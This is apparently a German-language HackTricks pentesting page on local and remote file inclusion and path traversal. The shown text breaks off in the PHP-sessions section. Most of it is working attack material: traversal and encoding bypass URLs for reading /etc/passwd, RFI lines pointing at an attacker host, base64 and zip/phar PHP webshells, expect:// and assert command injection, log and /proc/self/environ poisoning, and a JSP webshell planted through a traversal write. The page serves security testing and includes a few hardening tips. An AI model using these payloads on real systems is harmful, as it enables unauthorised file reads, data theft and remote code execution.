# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die Datei wird von einem entfernten Server geladen (Besser: Du kannst den Code schreiben und der Server führt ihn aus). In php ist dies standardmäßig **deaktiviert** (**allow_url_include**).\
**Local File Inclusion (LFI):** Der Server lädt eine lokale Datei.

Die Schwachstelle tritt auf, wenn ein Benutzer die Datei, die vom Server geladen werden soll, in irgendeiner Weise kontrollieren kann.

Anfällige **PHP-Funktionen**: require, require_once, include, include_once

Ein interessantes Tool, um diese Schwachstelle auszunutzen: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Durch Mischen mehrerer \*nix LFI-Listen und Hinzufügen weiterer Pfade habe ich diese erstellt:**

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen\
Versuche auch, `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /etc/password zu finden (um zu prüfen, ob die Verwundbarkeit besteht), findet man [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Zusammenführung verschiedener wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen\
Versuche auch, `C:/` zu entfernen und `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /boot.ini zu finden (um zu prüfen, ob die Verwundbarkeit besteht), findet man [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Sieh dir die LFI-Liste von linux an.

## Grundlegendes zu LFI und bypasses

Alle Beispiele beziehen sich auf Local File Inclusion, können aber auch auf Remote File Inclusion angewendet werden (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Traversal-Sequenzen werden nicht rekursiv entfernt
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass des Anhängens weiterer Zeichen am Ende der bereitgestellten Zeichenkette (Bypass von: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dies ist **seit PHP 5.4 behoben**

### **Kodierung**

Sie könnten nicht-standardmäßige Kodierungen wie double URL encode (und andere) verwenden:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Vom vorhandenen Ordner

Vielleicht überprüft das Backend den Ordnerpfad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Erkundung von Dateisystemverzeichnissen auf einem Server

Das Dateisystem eines Servers kann mithilfe bestimmter Techniken rekursiv durchsucht werden, um Verzeichnisse (nicht nur Dateien) zu identifizieren. Dieser Prozess umfasst das Ermitteln der Verzeichnistiefe und das Abfragen des Vorhandenseins bestimmter Ordner. Im Folgenden wird eine detaillierte Methode beschrieben, um dies zu erreichen:

1. **Verzeichnistiefe bestimmen:** Bestimme die Tiefe deines aktuellen Verzeichnisses, indem du erfolgreich die Datei `/etc/passwd` abrufst (gilt, wenn der Server Linux-basiert ist). Eine Beispiel-URL könnte wie folgt aufgebaut sein und auf eine Tiefe von drei hinweisen:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Hänge den Namen des vermuteten Ordners (z. B. `private`) an die URL an, und navigiere dann zurück zu `/etc/passwd`. Die zusätzliche Verzeichnisebene erfordert, die Tiefe um eins zu erhöhen:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ergebnisse interpretieren:** Die Antwort des Servers zeigt an, ob der Ordner existiert:
- **Fehler / Keine Ausgabe:** Der Ordner `private` existiert wahrscheinlich nicht an dem angegebenen Ort.
- **Inhalt von `/etc/passwd`:** Das Vorhandensein des Ordners `private` ist bestätigt.
4. **Rekursive Erkundung:** Gefundene Ordner können weiter auf Unterverzeichnisse oder Dateien untersucht werden, indem dieselbe Technik oder traditionelle Local File Inclusion (LFI)-Methoden verwendet werden.

Um Verzeichnisse an verschiedenen Orten im Dateisystem zu prüfen, passen Sie den payload entsprechend an. Zum Beispiel, um zu prüfen, ob `/var/www/` ein `private`-Verzeichnis enthält (angenommen, das aktuelle Verzeichnis befindet sich auf einer Tiefe von 3), verwenden Sie:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ist eine Methode, um Dateipfade in Webanwendungen zu manipulieren. Sie wird oft verwendet, um auf eingeschränkte Dateien zuzugreifen, indem bestimmte Sicherheitsmaßnahmen umgangen werden, die zusätzliche Zeichen an das Ende von Dateipfaden anhängen. Das Ziel ist es, einen Dateipfad zu konstruieren, der — nachdem die Sicherheitsmaßnahme ihn verändert hat — weiterhin auf die gewünschte Datei zeigt.

In PHP werden verschiedene Darstellungen eines Dateipfads aufgrund der Natur des Dateisystems als gleichwertig betrachtet. Zum Beispiel:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` werden alle als derselbe Pfad behandelt.
- Wenn die letzten 6 Zeichen `passwd` sind, ändert das Anhängen eines `/` (also `passwd/`) die angesprochene Datei nicht.
- Ähnlich verhält es sich, wenn `.php` an einen Dateipfad angehängt wird (z. B. `shellcode.php`): Ein Hinzufügen von `/.` am Ende verändert die aufgerufene Datei nicht.

Die folgenden Beispiele zeigen, wie man Path truncation nutzt, um auf `/etc/passwd` zuzugreifen, ein häufiges Ziel wegen seines sensiblen Inhalts (Benutzerkontoinformationen):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In diesen Szenarien kann die Anzahl der benötigten traversals etwa 2027 betragen, aber diese Zahl kann je nach Serverkonfiguration variieren.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) kombiniert mit zusätzlichen dot segments und Zeichen können verwendet werden, um im Dateisystem zu navigieren und angehängte Strings vom Server effektiv zu ignorieren.
- **Determining the Required Number of Traversals**: Durch Ausprobieren kann man die genaue Anzahl der `../`-Sequenzen ermitteln, die benötigt werden, um zum Root-Verzeichnis und dann zu `/etc/passwd` zu navigieren, wobei sichergestellt wird, dass angehängte Strings (wie `.php`) neutralisiert werden, aber der gewünschte Pfad (`/etc/passwd`) intakt bleibt.
- **Starting with a Fake Directory**: Es ist gängige Praxis, den Pfad mit einem nicht existierenden Verzeichnis (wie `a/`) zu beginnen. Diese Technik wird als Vorsichtsmaßnahme verwendet oder um die Anforderungen der Pfad-Parsing-Logik des Servers zu erfüllen.

Beim Einsatz von path truncation techniques ist es entscheidend, das Pfad-Parsing-Verhalten des Servers und die Dateisystemstruktur zu verstehen. Jedes Szenario kann einen anderen Ansatz erfordern, und Tests sind oft notwendig, um die effektivste Methode zu finden.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php ist das standardmäßig deaktiviert, weil **`allow_url_include`** auf **Off.** steht. Es muss auf **On** gesetzt sein, damit es funktioniert, und in diesem Fall könntest du eine PHP-Datei von deinem Server einbinden und RCE erhalten:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Wenn aus irgendeinem Grund **`allow_url_include`** **On** ist, aber PHP den Zugriff auf externe Webseiten **filtert**, [laut diesem Beitrag](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), könntest du zum Beispiel das data-Protokoll mit base64 verwenden, um einen b64 PHP-Code zu dekodieren und RCE zu erzielen:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Im vorherigen Code wurde das abschließende `+.txt` hinzugefügt, weil der attacker eine Zeichenfolge benötigte, die mit `.txt` endet. Die Zeichenfolge endet also damit und nach dem b64 decode liefert dieser Teil nur Junk zurück und der eigentliche PHP-Code wird eingebunden (und damit ausgeführt).
>
> Ein weiteres Beispiel, das **nicht das `php://` Protokoll verwendet**, wäre:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root-Element

In python in einem Code wie diesem:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Wenn der Benutzer einen **absoluten Pfad** an **`file_name`** übergibt, wird der **vorherige Pfad einfach entfernt**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dies ist das beabsichtigte Verhalten laut [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Wenn eine Komponente ein absoluter Pfad ist, werden alle vorherigen Komponenten verworfen und das Zusammenfügen wird ab der absoluten Pfadkomponente fortgesetzt.

## Java Verzeichnisse auflisten

Es scheint, dass wenn man in Java eine Path Traversal hat und man **ein Verzeichnis anfragt** statt einer Datei, eine **Auflistung des Verzeichnisses zurückgegeben wird**. Das passiert in anderen Sprachen nicht (soweit ich weiß).

## Top 25 Parameter

Hier ist eine Liste der Top-25-Parameter, die anfällig für local file inclusion (LFI)-Schwachstellen sein könnten (von [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI mithilfe von PHP-Wrappers & Protokollen

### php://filter

PHP-Filters erlauben das Durchführen grundlegender **Modifikationsoperationen an den Daten**, bevor diese gelesen oder geschrieben werden. Es gibt 5 Kategorien von Filtern:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Entfernt Tags aus den Daten (alles zwischen "<" und ">" Zeichen)
- Beachte, dass dieser Filter in modernen Versionen von PHP nicht mehr vorhanden ist
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Wandelt in eine andere Kodierung um (`convert.iconv.<input_enc>.<output_enc>`). Um die **Liste aller unterstützten Kodierungen** zu erhalten, führe in der Konsole aus: `iconv -l`

> [!WARNING]
> Durch Missbrauch des `convert.iconv.*` Conversion-Filters kann man **beliebigen Text erzeugen**, was nützlich sein kann, um beliebigen Text zu schreiben oder Funktionen wie include beliebigen Text verarbeiten zu lassen. Für mehr Infos siehe [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimiert den Inhalt (nützlich beim exfiltrating großer Informationsmengen)
- `zlib.inflate`: Dekomprimiert die Daten
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Veraltet
- `mdecrypt.*` : Veraltet
- Other Filters
- Führt man in PHP `var_dump(stream_get_filters());` aus, findet man ein paar **unerwartete Filter**:
- `consumed`
- `dechunk`: kehrt HTTP chunked encoding um
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Der Teil "php://filter" ist nicht case-sensitiv

### Verwendung von php filters als oracle, um beliebige Dateien zu lesen

[**In diesem Beitrag**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) wird eine Technik vorgeschlagen, mit der sich eine lokale Datei lesen lässt, ohne dass die Ausgabe vom Server direkt zurückgegeben wird. Diese Technik basiert auf einer **boolean exfiltration of the file (char by char) using php filters** als oracle. Das liegt daran, dass php filters verwendet werden können, um einen Text so groß zu machen, dass php eine Exception wirft.

Im Originalbeitrag findet sich eine detaillierte Erklärung der Technik, hier eine kurze Zusammenfassung:

- Verwende den Codec **`UCS-4LE`**, um das führende Zeichen des Textes am Anfang zu belassen und die Größe des Strings exponentiell zu vergrößern.
- Das wird genutzt, um einen **Text zu erzeugen, der so groß ist, wenn der Anfangsbuchstabe korrekt geraten wurde**, dass php einen **Fehler** auslöst.
- Der **dechunk** Filter wird **alles löschen, wenn das erste Zeichen kein hexadezimales Zeichen ist**, sodass wir herausfinden können, ob das erste Zeichen hex ist.
- Dies, kombiniert mit dem vorherigen (und anderen Filtern abhängig vom geratenen Zeichen), erlaubt es uns, ein Zeichen am Anfang des Textes zu erraten, indem wir sehen, wann wir genügend Transformationen durchführen, um es aus dem hex-Bereich zu bewegen. Denn wenn es hex ist, löscht dechunk es nicht und die initiale Bombe verursacht den php-Fehler.
- Der Codec **convert.iconv.UNICODE.CP930** transformiert jeden Buchstaben in den folgenden (also nach diesem codec: a -> b). Dadurch können wir z. B. erkennen, ob das erste Zeichen ein `a` ist, weil wenn wir diesen Codec 6-mal anwenden a->b->c->d->e->f->g, das Zeichen nicht mehr hexadezimal wäre; folglich löscht dechunk es nicht und der php-Fehler wird ausgelöst, weil er mit der initialen Bombe multipliziert.
- Durch andere Transformationen wie **rot13** am Anfang ist es möglich, weitere Zeichen wie n, o, p, q, r zu leak'en (und andere Codecs können verwendet werden, um andere Buchstaben in den hex-Bereich zu verschieben).
- Wenn das Anfangszeichen eine Zahl ist, muss es base64 enkodiert werden und die ersten 2 Zeichen per leak ermittelt werden, um die Zahl zu erhalten.
- Das finale Problem ist zu sehen, **wie man mehr als das Anfangszeichen leaked**. Durch Einsatz von Order-Memory-Filtern wie **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** ist es möglich, die Reihenfolge der Zeichen zu ändern und so andere Zeichen des Textes an die erste Position zu bringen.
- Und um weitere Daten zu erhalten besteht die Idee darin, **zwei Bytes Junk-Daten am Anfang** mit **convert.iconv.UTF16.UTF16** zu erzeugen, **UCS-4LE** anzuwenden, um sie **mit den nächsten 2 Bytes zu pivotieren**, und die Daten bis zu den Junk-Bytes zu löschen (das entfernt die ersten 2 Bytes des ursprünglichen Textes). Dies wird so lange wiederholt, bis das gewünschte Bit zum leak erreicht ist.

Im Beitrag wurde auch ein Tool zum automatisierten Ausführen geleakt: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Dieser wrapper erlaubt den Zugriff auf file descriptors, die der Prozess geöffnet hat. Potenziell nützlich, um den Inhalt geöffneter Dateien zu exfiltrieren:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Du kannst auch **php://stdin, php://stdout and php://stderr** verwenden, um jeweils auf die **file descriptors 0, 1 and 2** zuzugreifen (ich bin mir nicht sicher, wie das in einem Angriff nützlich sein könnte)

### zip:// and rar://

Lade eine Zip- oder Rar-Datei mit einer PHPShell darin hoch und greife darauf zu.\
Um das rar-Protokoll missbrauchen zu können, muss es **speziell aktiviert werden**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Beachte, dass dieses Protokoll durch php-Konfigurationen **`allow_url_open`** und **`allow_url_include`** eingeschränkt ist

### expect://

Expect muss aktiviert sein. Du kannst damit Code ausführen:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Gib deinen payload in den POST-Parametern:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Eine `.phar`-Datei kann genutzt werden, um PHP-Code auszuführen, wenn eine Webanwendung Funktionen wie `include` zum Laden von Dateien verwendet. Der unten gezeigte PHP-Code-Schnipsel demonstriert die Erstellung einer `.phar`-Datei:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Um die `.phar`-Datei zu kompilieren, sollte der folgende Befehl ausgeführt werden:
```bash
php --define phar.readonly=0 create_path.php
```
Beim Ausführen wird eine Datei mit dem Namen `test.phar` erstellt, die potenziell genutzt werden könnte, um Local File Inclusion (LFI)-Schwachstellen auszunutzen.

In Fällen, in denen die LFI nur Dateien liest, ohne den darin enthaltenen PHP-Code auszuführen, etwa über Funktionen wie `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` oder `filesize()`, könnte versucht werden, eine Deserialisierungs-Schwachstelle auszunutzen. Diese Schwachstelle hängt mit dem Lesen von Dateien über das `phar`-Protokoll zusammen.

Für ein detailliertes Verständnis der Ausnutzung von Deserialisierungs-Schwachstellen im Zusammenhang mit `.phar`-Dateien, siehe das unten verlinkte Dokument:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Kurzfassung: Ein **3 byte overflow** im PHP-Heap wurde ausgenutzt, um die **Kette freier Chunks** einer bestimmten Größe zu verändern, um **beliebigen Inhalt an beliebiger Adresse schreiben** zu können, weshalb ein Hook hinzugefügt wurde, um **`system`** aufzurufen.\
Es war möglich, Chunks bestimmter Größen zu allocen, indem weitere php filters missbraucht wurden.

### Weitere Protokolle

Weitere mögliche[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Schreibt in den Speicher oder in eine temporäre Datei (nicht sicher, wie das in einem file inclusion Angriff nützlich sein kann)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Zugriff auf das lokale Dateisystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Zugriff auf HTTP(s)-URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Zugriff auf FTP(s)-URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressions-Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Findet Pfadnamen, die einem Muster entsprechen (Gibt nichts Druckbares zurück, daher hier nicht wirklich nützlich)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Nicht nützlich, um beliebige Dateien zu lesen)

## LFI über PHPs 'assert'

Die Risiken von Local File Inclusion (LFI) in PHP sind besonders hoch im Umgang mit der 'assert'-Funktion, die Code innerhalb von Strings ausführen kann. Das ist besonders problematisch, wenn Eingaben mit directory traversal Zeichen wie ".." geprüft, aber nicht richtig bereinigt werden.

Beispielsweise könnte PHP-Code so ausgelegt sein, directory traversal zu verhindern:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Während dies traversal verhindern soll, schafft es unbeabsichtigt einen Vektor für code injection. Um dies zum Auslesen von Dateiinhalten auszunutzen, könnte ein Angreifer Folgendes verwenden:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ähnlich dazu, um beliebige Systembefehle auszuführen, könnte man verwenden:
```plaintext
' and die(system("id")) or '
```
Es ist wichtig, **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Diese Technik ist relevant in Fällen, in denen du die **control** über den **file path** einer **PHP function** hast, die eine **access a file** durchführt, du aber den Inhalt der Datei nicht siehst (wie ein einfacher Aufruf von **`file()`**), obwohl der Inhalt nicht angezeigt wird.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wird erklärt, wie ein blind path traversal über PHP filter missbraucht werden kann, um den Inhalt einer Datei via an error oracle zu exfiltrate.

Zusammenfassend verwendet die Technik die **"UCS-4LE" encoding**, um den Inhalt einer Datei so **big** zu machen, dass die **PHP function opening** die Datei einen **error** auslöst.

Dann wird, um das erste Zeichen zu leak, der Filter **`dechunk`** zusammen mit anderen wie **base64** oder **rot13** verwendet, und schließlich werden die Filter **convert.iconv.UCS-4.UCS-4LE** und **convert.iconv.UTF16.UTF-16BE** genutzt, um **place other chars at the beggining and leak them**.

Funktionen, die anfällig sein könnten: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Für technische Details siehe den genannten Beitrag!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wenn serverseitiger Code, der Dateien entgegennimmt/hochlädt, den Zielpfad unter Verwendung von von Benutzern kontrollierten Daten (z. B. ein Dateiname oder eine URL) ohne Canonicalisierung und Validierung zusammensetzt, können `..`-Segmente und absolute Pfade aus dem vorgesehenen Verzeichnis entkommen und ein beliebiges Datei-Write verursachen. Wenn du das Payload in ein web-exposed Verzeichnis platzieren kannst, erhältst du in der Regel unauthenticated RCE, indem du eine Webshell ablegst.

Typischer Exploit-Ablauf:
- Identifiziere ein Schreib-Primitive in einem Endpoint oder Hintergrund-Worker, das einen Pfad/Dateinamen akzeptiert und Inhalt auf die Festplatte schreibt (z. B. message-driven ingestion, XML/JSON command handlers, ZIP extractors, usw.).
- Bestimme web-exposed Verzeichnisse. Häufige Beispiele:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Erzeuge einen Traversal-Pfad, der aus dem vorgesehenen Storage-Verzeichnis in die Webroot ausbricht, und füge deinen Webshell-Inhalt ein.
- Rufe das abgelegte Payload im Browser auf und führe Befehle aus.

Hinweise:
- Der verwundbare Dienst, der den Schreibvorgang ausführt, kann auf einem non-HTTP-Port lauschen (z. B. ein JMF XML listener auf TCP 4004). Das Hauptwebportal (anderer Port) wird später dein Payload bereitstellen.
- Auf Java-Stacks werden diese Datei-Schreibvorgänge oft mit einfacher `File`/`Paths`-Konkatenation implementiert. Das Fehlen von Canonicalisierung/Allow-Listing ist der Kernfehler.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Härtungsmaßnahmen, die diese Klasse von Schwachstellen abwehren:
- Auf einen kanonischen Pfad auflösen und sicherstellen, dass er ein Unterverzeichnis eines zugelassenen Basisverzeichnisses ist.
- Jeden Pfad ablehnen, der `..`, absolute Wurzeln oder Laufwerksbuchstaben enthält; generierte Dateinamen bevorzugen.
- Den Schreibprozess als niedrig privilegiertes Konto ausführen und Schreibverzeichnisse von den ausgelieferten Root-Verzeichnissen trennen.

## Remote File Inclusion

Erklärt zuvor, [**follow this link**](#remote-file-inclusion).

### Über Apache/Nginx-Logdatei

Wenn der Apache- oder Nginx-Server **vulnerable to LFI** im include-Mechanismus ist, können Sie versuchen, auf **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`** zuzugreifen, im **user agent** oder in einem **GET parameter** eine php-Shell wie **`<?php system($_GET['c']); ?>`** zu setzen und diese Datei zu includen

> [!WARNING]
> Beachten Sie, dass **wenn Sie doppelte Anführungszeichen** für die Shell statt **einfache Anführungszeichen** verwenden, die doppelten Anführungszeichen für den String "_**quote;**_" verändert werden, **PHP dort einen Fehler wirft** und **nichts weiter ausgeführt wird**.
>
> Außerdem stellen Sie sicher, dass Sie **das payload korrekt schreiben**, sonst wirft PHP jedes Mal einen Fehler, wenn es versucht, die Logdatei zu laden, und Sie bekommen keine zweite Gelegenheit.

Das könnte auch in anderen Logs funktionieren, aber **vorsichtig sein,** der Code in den Logs könnte URL encoded sein und dadurch die Shell zerstört werden. Der Header **authorisation "basic"** enthält "user:password" in Base64 und wird in den Logs dekodiert. Die PHPShell könnte in diesen Header eingefügt werden.\
Weitere mögliche Logpfade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Per E-Mail

**Sende eine E-Mail** an ein internes Konto (user@localhost), die deinen PHP-Payload wie `<?php echo system($_REQUEST["cmd"]); ?>` enthält und versuche, die Mail des Benutzers mit einem Pfad wie **`/var/mail/<USERNAME>`** oder **`/var/spool/mail/<USERNAME>`** einzubinden.

### Über /proc/\*/fd/\*

1. Lade viele shells hoch (z. B.: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), mit $PID = PID des Prozesses (can be brute forced) und $FD = file descriptor (can be brute forced too)

### Über /proc/self/environ

Wie bei einer Logdatei: Sende den payload im User-Agent; er wird in der Datei /proc/self/environ reflektiert.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Per upload

Wenn du eine Datei uploaden kannst, injiziere einfach das shell payload hinein (z. B.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Um die Datei lesbar zu halten, ist es am besten, in die Metadaten von Bildern/Dokumenten/PDFs zu injizieren

### Per Upload einer ZIP-Datei

Lade eine ZIP-Datei hoch, die eine komprimierte PHP shell enthält, und greife darauf zu:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Über PHP sessions

Prüfe, ob die Website PHP Session (PHPSESSID) verwendet
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
